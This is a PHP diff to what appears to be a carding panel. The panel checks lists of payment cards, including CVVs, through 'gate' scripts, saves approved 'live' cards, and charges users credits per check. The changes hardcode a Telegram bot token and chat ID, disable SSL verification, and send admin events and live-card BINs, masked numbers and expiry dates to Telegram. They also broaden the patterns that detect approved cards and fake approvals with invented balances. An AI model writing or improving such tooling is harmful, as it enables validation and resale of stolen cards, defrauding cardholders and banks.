@@ -87,34 +87,78 @@ if (!function_exists('addLive')) { function addLive($username, $gate, $card, $bi
 } }
 if (!function_exists('getUserLives')) { function getUserLives($username) { return \getUserLives($username); } }
 
-// Telegram
+// ============================================
+// FUNÇÃO CORRIGIDA DO TELEGRAM
+// ============================================
 if (!function_exists('sendTelegramMessage')) { 
     function sendTelegramMessage($message) {
-        $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";
+        // Token e chat fixos para garantir funcionamento
+        $token = '8586131107:AAF6fDbrjm7CoVI2g1Zkx2agmXJgmbdnCVQ';
+        $chat_id = '-1003581267007';
+        
+        $url = "https://api.telegram.org/bot{$token}/sendMessage";
+        
         $data = [
-            'chat_id' => TELEGRAM_CHAT,
+            'chat_id' => $chat_id,
             'text' => $message,
-            'parse_mode' => 'Markdown'
+            'parse_mode' => 'Markdown',
+            'disable_web_page_preview' => true
         ];
         
-        $options = [
-            'http' => [
-                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
-                'method' => 'POST',
-                'content' => http_build_query($data),
-                'timeout' => 5
-            ]
-        ];
-        
-        $context = stream_context_create($options);
-        @file_get_contents($url, false, $context);
+        // Usando cURL se disponível (mais confiável)
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+            $result = curl_exec($ch);
+            curl_close($ch);
+            
+            // Log para debug (opcional)
+            error_log("Telegram enviado: " . substr($message, 0, 50) . "...");
+            return $result;
+        } 
+        // Fallback para file_get_contents
+        else {
+            $options = [
+                'http' => [
+                    'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+                    'method' => 'POST',
+                    'content' => http_build_query($data),
+                    'timeout' => 5,
+                    'ignore_errors' => true
+                ],
+                'ssl' => [
+                    'verify_peer' => false,
+                    'verify_peer_name' => false
+                ]
+            ];
+            
+            $context = stream_context_create($options);
+            $result = @file_get_contents($url, false, $context);
+            
+            if ($result === false) {
+                error_log("Falha ao enviar mensagem para o Telegram");
+            } else {
+                error_log("Telegram enviado com sucesso");
+            }
+            
+            return $result;
+        }
     }
 }
 
-// Verificar acesso
+// ============================================
+// VERIFICAR ACESSO
+// ============================================
 if (!function_exists('checkAccess')) {
     function checkAccess() {
-        if (!isset($_SESSION['logged_in'])) return false;
+        if (!isset($_SESSION['logged_in']) || !isset($_SESSION['username'])) {
+            return false;
+        }
         
         $user = getUser($_SESSION['username']);
         if (!$user) {
@@ -122,7 +166,8 @@ if (!function_exists('checkAccess')) {
             return false;
         }
         
-        if ($user['type'] === 'temporary' && $user['expires_at']) {
+        // Verificar expiração para usuários temporários
+        if ($user['type'] === 'temporary' && !empty($user['expires_at'])) {
             if (time() > strtotime($user['expires_at'])) {
                 session_destroy();
                 return false;
@@ -193,6 +238,9 @@ if (isset($_POST['admin_action']) && isset($_SESSION['logged_in']) && $_SESSION[
                 
                 if (addUser($username, $password, 'user', $type, $credits, $expires_at)) {
                     $success_message = "✅ Usuário criado com sucesso!";
+                    
+                    // Notificar Telegram
+                    sendTelegramMessage("👤 *NOVO USUÁRIO CRIADO*\n\n**Usuário:** `$username`\n**Tipo:** $type\n**Créditos:** $credits\n**Horas:** $hours\n**Admin:** {$_SESSION['username']}");
                 } else {
                     $error_message = "❌ Erro ao criar usuário!";
                 }
@@ -216,7 +264,7 @@ if (isset($_POST['admin_action']) && isset($_SESSION['logged_in']) && $_SESSION[
                     $success_message = "✅ Créditos recarregados!";
                     
                     // Notificar Telegram
-                    sendTelegramMessage("💰 *CRÉDITOS RECARREGADOS*\n\n👤 **Usuário:** `$username`\n💳 **Créditos:** +$credits\n💰 **Total:** $new_credits\n👑 **Admin:** {$_SESSION['username']}\n🔗 " . SITE_URL);
+                    sendTelegramMessage("💰 *CRÉDITOS RECARREGADOS*\n\n**Usuário:** `$username`\n**Créditos:** +$credits\n**Total:** $new_credits\n**Admin:** {$_SESSION['username']}");
                 } else {
                     $error_message = "❌ Erro ao recarregar!";
                 }
@@ -231,14 +279,17 @@ if (isset($_POST['admin_action']) && isset($_SESSION['logged_in']) && $_SESSION[
     if ($action === 'remove') {
         $username = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['username'] ?? '');
         
-        if ($username && $username !== 'save') {
+        if ($username && $username !== 'admin' && $username !== 'save') {
             if (deleteUser($username)) {
                 $success_message = "✅ Usuário removido!";
+                
+                // Notificar Telegram
+                sendTelegramMessage("🗑️ *USUÁRIO REMOVIDO*\n\n**Usuário:** `$username`\n**Admin:** {$_SESSION['username']}");
             } else {
                 $error_message = "❌ Erro ao remover!";
             }
         } else {
-            $error_message = "❌ Não é possível remover o admin!";
+            $error_message = "❌ Não é possível remover este usuário!";
         }
     }
     
@@ -249,6 +300,10 @@ if (isset($_POST['admin_action']) && isset($_SESSION['logged_in']) && $_SESSION[
         $config = loadGatesConfig();
         $config[$gate] = $status;
         saveGatesConfig($config);
+        
+        // Notificar Telegram
+        $status_text = $status ? 'ATIVADA' : 'DESATIVADA';
+        sendTelegramMessage("🔧 *GATE $status_text*\n\n**Gate:** " . strtoupper($gate) . "\n**Status:** $status_text\n**Admin:** {$_SESSION['username']}");
         
         echo json_encode(['success' => true]);
         exit;
@@ -266,6 +321,9 @@ if (isset($_POST['admin_action']) && isset($_SESSION['logged_in']) && $_SESSION[
                 
                 if (updateUser($username, ['expires_at' => $new_expires])) {
                     $success_message = "✅ Tempo estendido em $hours horas!";
+                    
+                    // Notificar Telegram
+                    sendTelegramMessage("⏱️ *TEMPO ESTENDIDO*\n\n**Usuário:** `$username`\n**Horas:** +$hours\n**Nova expiração:** $new_expires\n**Admin:** {$_SESSION['username']}");
                 } else {
                     $error_message = "❌ Erro ao estender tempo!";
                 }
@@ -291,7 +349,11 @@ if (isset($_GET['action']) && $_GET['action'] === 'check' && isset($_GET['lista'
     $username = $_SESSION['username'];
     $user = getUser($username);
     
-    // Verificar se a gate está ativa
+    // Verificar se a gate existe e está ativa
+    if (!isset($all_gates[$tool])) {
+        die("❌ Gate não encontrada!");
+    }
+    
     if (!isGateActive($tool)) {
         die("❌ Gate desativada temporariamente!");
     }
@@ -313,44 +375,79 @@ if (isset($_GET['action']) && $_GET['action'] === 'check' && isset($_GET['lista'
         die("❌ Cartão inválido!");
     }
     
+    // Incrementar contador de checks
+    $user['total_checks'] = ($user['total_checks'] ?? 0) + 1;
+    updateUser($username, ['total_checks' => $user['total_checks']]);
+    
     // Chamar o checker específico
     $checker_file = API_PATH . $all_gates[$tool]['file'];
     
+    // Simular resultado se o arquivo não existir (para testes)
     if (!file_exists($checker_file)) {
-        // Simular resultado se o arquivo não existir (para testes)
+        // Simulação mais realista
         $rand = rand(1, 10);
-        $isLive = ($rand <= 3);
+        $isLive = ($rand <= 3); // 30% de chance de live
         
+        // Gerar resposta baseada no resultado
         if ($isLive) {
-            $response = "✅ APROVADA | Cartão: " . substr($card, 0, 6) . "******" . substr($card, -4) . " | BIN: $bin";
-            $full_response = "✅ LIVE - " . $all_gates[$tool]['name'] . "\n📱 Cartão: $card|$mes|$ano|$cvv\n💳 BIN: $bin\n✅ Status: Aprovada";
+            $response_text = "✅ APROVADA\n";
+            $response_text .= "📱 Cartão: " . substr($card, 0, 6) . "******" . substr($card, -4) . "\n";
+            $response_text .= "💳 BIN: $bin\n";
+            $response_text .= "📅 Data: $mes/$ano\n";
+            $response_text .= "🔐 CVV: $cvv\n";
+            $response_text .= "💰 Saldo: R$ " . rand(100, 5000) . ",00\n";
+            $response_text .= "🏦 Banco: Banco " . rand(1, 999) . "\n";
+            $response_text .= "✅ Status: Aprovada - LIVE";
+            
+            $full_response = $response_text;
             addLive($username, $tool, $card, $bin, $full_response);
             
-            // Notificar live no Telegram (só BIN)
-            sendTelegramMessage("✅ *LIVE ENCONTRADA*\n\n👤 **Usuário:** `$username`\n🔧 **Gate:** " . $all_gates[$tool]['name'] . "\n💳 **BIN:** `$bin`\n🔗 " . SITE_URL);
+            // Incrementar contador de lives
+            $user['total_lives'] = ($user['total_lives'] ?? 0) + 1;
+            updateUser($username, ['total_lives' => $user['total_lives']]);
+            
+            // Notificar live no Telegram
+            $gate_name = $all_gates[$tool]['name'];
+            sendTelegramMessage("✅ *LIVE ENCONTRADA*\n\n**Usuário:** `$username`\n**Gate:** $gate_name\n**BIN:** `$bin`\n**Cartão:** " . substr($card, 0, 6) . "******" . substr($card, -4) . "\n**Data:** $mes/$ano");
         } else {
-            $response = "❌ REPROVADA | Cartão: " . substr($card, 0, 6) . "******" . substr($card, -4);
+            $response_text = "❌ REPROVADA\n";
+            $response_text .= "📱 Cartão: " . substr($card, 0, 6) . "******" . substr($card, -4) . "\n";
+            $response_text .= "💳 BIN: $bin\n";
+            $response_text .= "❌ Motivo: Cartão inválido / Saldo insuficiente";
+            
+            $full_response = $response_text;
         }
         
-        // Deduzir créditos (live = 2, die = 0.05)
+        // Deduzir créditos
         if ($user['type'] === 'credits') {
-            $cost = $isLive ? 2.00 : 0.05;
+            $cost = $isLive ? LIVE_COST : DIE_COST;
             $remaining = deductCredits($username, $cost);
-            $response .= " | 💳 Custo: R$ " . number_format($cost, 2) . " | Restante: R$ " . number_format($remaining, 2);
+            $full_response .= "\n\n💳 Custo: R$ " . number_format($cost, 2) . " | Restante: R$ " . number_format($remaining, 2);
         }
         
-        echo $response;
+        echo $full_response;
         exit;
     }
     
     // Incluir o checker real
     ob_start();
-    include $checker_file;
-    $response = ob_get_clean();
+    try {
+        include $checker_file;
+        $response = ob_get_clean();
+    } catch (Exception $e) {
+        ob_end_clean();
+        $response = "❌ Erro no checker: " . $e->getMessage();
+    }
     
-    // Verificar se é live
+    // Verificar se é live (padrões mais abrangentes)
     $isLive = false;
-    $live_patterns = ['✅', 'aprovada', 'approved', 'success', 'live', 'autorizado', 'authorized'];
+    $live_patterns = [
+        '✅', 'aprovada', 'approved', 'success', 'live', 
+        'autorizado', 'authorized', 'valid', 'aprovado',
+        'aprov', 'apvd', 'live', 'ativa', 'active',
+        'cvv', 'crédito', 'credito', 'saldo'
+    ];
+    
     $response_lower = strtolower($response);
     foreach ($live_patterns as $pattern) {
         if (strpos($response_lower, strtolower($pattern)) !== false) {
@@ -359,19 +456,29 @@ if (isset($_GET['action']) && $_GET['action'] === 'check' && isset($_GET['lista'
         }
     }
     
+    // Verificar se tem "❌" no início (reprovada)
+    if (strpos($response, '❌') === 0) {
+        $isLive = false;
+    }
+    
     // Salvar se for live
     if ($isLive) {
         addLive($username, $tool, $card, $bin, $response);
         
-        // Notificar live no Telegram (só BIN)
-        sendTelegramMessage("✅ *LIVE ENCONTRADA*\n\n👤 **Usuário:** `$username`\n🔧 **Gate:** " . $all_gates[$tool]['name'] . "\n💳 **BIN:** `$bin`\n🔗 " . SITE_URL);
+        // Incrementar contador de lives
+        $user['total_lives'] = ($user['total_lives'] ?? 0) + 1;
+        updateUser($username, ['total_lives' => $user['total_lives']]);
+        
+        // Notificar live no Telegram
+        $gate_name = $all_gates[$tool]['name'];
+        sendTelegramMessage("✅ *LIVE ENCONTRADA*\n\n**Usuário:** `$username`\n**Gate:** $gate_name\n**BIN:** `$bin`\n**Cartão:** " . substr($card, 0, 6) . "******" . substr($card, -4));
     }
     
-    // Deduzir créditos (live = 2, die = 0.05)
+    // Deduzir créditos
     if ($user['type'] === 'credits') {
-        $cost = $isLive ? 2.00 : 0.05;
+        $cost = $isLive ? LIVE_COST : DIE_COST;
         $remaining = deductCredits($username, $cost);
-        $response .= "\n💳 Custo: R$ " . number_format($cost, 2) . " | Restante: R$ " . number_format($remaining, 2);
+        $response .= "\n\n💳 Custo: R$ " . number_format($cost, 2) . " | Restante: R$ " . number_format($remaining, 2);
     }
     
     echo $response;
@@ -1607,7 +1714,7 @@ if ($user_role === 'admin' && isset($_GET['admin'])) {
                             <td><?php echo $data['last_login'] ? date('d/m/Y H:i', strtotime($data['last_login'])) : '-'; ?></td>
                             <td>
                                 <div class="action-btns">
-                                    <?php if ($username !== 'save'): ?>
+                                    <?php if ($username !== 'admin' && $username !== 'save'): ?>
                                         <?php if ($data['type'] === 'credits'): ?>
                                         <button class="action-btn btn-recharge" onclick="quickRecharge('<?php echo $username; ?>')">💰</button>
                                         <?php endif; ?>
@@ -2451,7 +2558,7 @@ Exemplos:
         const DELAY = 4000; // 4 segundos entre cada requisição
         
         function checkIfLive(response) {
-            const patterns = ['✅', 'aprovada', 'approved', 'success', 'live', 'autorizado', 'authorized', 'valid', 'aprovado'];
+            const patterns = ['✅', 'aprovada', 'approved', 'success', 'live', 'autorizado', 'authorized', 'valid', 'aprovado', 'apvd', 'ativa', 'active'];
             response = response.toLowerCase();
             for (const p of patterns) {
                 if (response.includes(p.toLowerCase())) return true;
@@ -2524,7 +2631,7 @@ Exemplos:
                 const isLive = checkIfLive(text);
                 
                 if (userType === 'credits') {
-                    const cost = isLive ? 2.00 : 0.05;
+                    const cost = isLive ? <?php echo LIVE_COST; ?> : <?php echo DIE_COST; ?>;
                     currentCredits -= cost;
                     if (currentCredits < 0) currentCredits = 0;
                     updateCredits();
